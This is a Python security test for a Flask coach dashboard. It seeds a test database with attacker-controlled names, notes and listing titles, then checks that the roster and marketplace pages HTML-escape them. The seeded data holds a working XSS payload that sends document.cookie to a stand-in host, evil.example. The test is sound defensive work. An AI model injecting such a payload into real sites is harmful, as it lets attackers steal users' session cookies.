"""
Run in an isolated subprocess (see test_coach_dashboard_xss.py) with
DATABASE_URL already pointed at a throwaway file, BEFORE any app module is
imported -- database.py/config.py bind their engine at import time, so this
has to happen first for the app's own SessionLocal to hit our test DB.

Exercises the exact real-world attack path found during the audit:
  1. A "player" registers with a Telegram first_name containing an XSS
     payload (first_name is fully attacker-controlled -- Telegram lets any
     user set it to anything).
  2. A coach adds them to the roster and the player applies to a job
     listing with a malicious note.
  3. The coach opens the real Flask routes (roster, marketplace applicant
     list) via Flask's test client, exactly as their browser would.
  4. Assert the payload never appears unescaped in the rendered HTML.
"""
import sys

from database import init_db, SessionLocal
from models import (
    User, UserRole, Team, TeamMembership, Opportunity, OpportunityApplication,
    ListingType, ListingStatus, EquipmentListing, EquipmentCondition,
)

PAYLOAD = "<script>document.location='https://evil.example/steal?c='+document.cookie</script>"

init_db()
session = SessionLocal()
try:
    coach = User(telegram_id=90001, username="coach1", first_name="Coach", role=UserRole.COACH, registration_complete=True)
    attacker = User(telegram_id=90002, username="attacker", first_name=PAYLOAD, role=UserRole.PLAYER, registration_complete=True)
    session.add_all([coach, attacker])
    session.commit()

    team = Team(owner_user_id=coach.id, name="Test FC")
    session.add(team)
    session.commit()

    membership = TeamMembership(team_id=team.id, player_user_id=attacker.id)
    session.add(membership)

    other_team_owner = User(telegram_id=90003, username="other_coach", first_name="Other", role=UserRole.COACH, registration_complete=True)
    session.add(other_team_owner)
    session.commit()
    other_team = Team(owner_user_id=other_team_owner.id, name="Rival FC")
    session.add(other_team)
    session.commit()

    opp = Opportunity(
        team_id=team.id, posted_by_user_id=coach.id, listing_type=ListingType.TRIAL,
        title="U15 Trial", description="Come try out", status=ListingStatus.OPEN,
    )
    session.add(opp)
    session.commit()
    application = OpportunityApplication(opportunity_id=opp.id, applicant_user_id=attacker.id, note=PAYLOAD)
    session.add(application)

    evil_listing = EquipmentListing(
        team_id=other_team.id, created_by_user_id=other_team_owner.id,
        title=PAYLOAD, condition=EquipmentCondition.GOOD,
    )
    session.add(evil_listing)
    session.commit()

    coach_id = coach.id
    opp_id = opp.id
finally:
    session.close()

import coach_dashboard  # noqa: E402  (must import after DATABASE_URL is set)

coach_dashboard.app.config["TESTING"] = True
client = coach_dashboard.app.test_client()

failures = []

with client.session_transaction() as flask_sess:
    flask_sess["user_id"] = coach_id

pages = {
    "roster": "/coach/roster",
    "marketplace_opportunity_detail": f"/coach/marketplace/opportunities/{opp_id}",
    "marketplace_equipment": "/coach/marketplace/equipment",
}

for name, url in pages.items():
    resp = client.get(url)
    body = resp.get_data(as_text=True)
    if PAYLOAD in body:
        failures.append(f"{name} ({url}): raw <script> payload found UNESCAPED in response")
    elif "&lt;script&gt;" not in body and "evil.example" not in body:
        # The attacker-controlled string should still show up *somewhere*
        # (escaped) -- if it's missing entirely the test setup itself is
        # broken, not a security pass.
        failures.append(f"{name} ({url}): expected escaped payload marker not found at all -- test setup issue?")

if failures:
    print("XSS PROBE FAILED:")
    for f in failures:
        print(" -", f)
    sys.exit(1)

print("XSS PROBE PASSED: payload was HTML-escaped on every page checked")
sys.exit(0)
